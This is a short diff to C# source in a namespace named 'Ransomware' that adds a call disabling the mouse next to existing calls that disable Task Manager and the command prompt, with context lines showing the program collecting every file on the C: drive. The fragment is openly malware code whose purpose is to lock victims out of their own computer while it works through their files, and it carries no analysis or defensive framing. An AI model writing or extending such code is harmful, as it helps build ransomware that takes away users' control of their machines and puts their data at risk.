@@ -13,6 +13,7 @@ namespace Ransomware
         {
             DisableTaskManager();
             DisableCMD();
+            DisableMouse();
 
             string directory = @"C:\";
             string[] files = Directory.GetFiles(directory, "*", SearchOption.AllDirectories);
@@ -63,6 +64,7 @@ namespace Ransomware
 
             EnableTaskManager();
             EnableCMD();
+            EnableMouse();
 
             Console.ReadLine();
         }
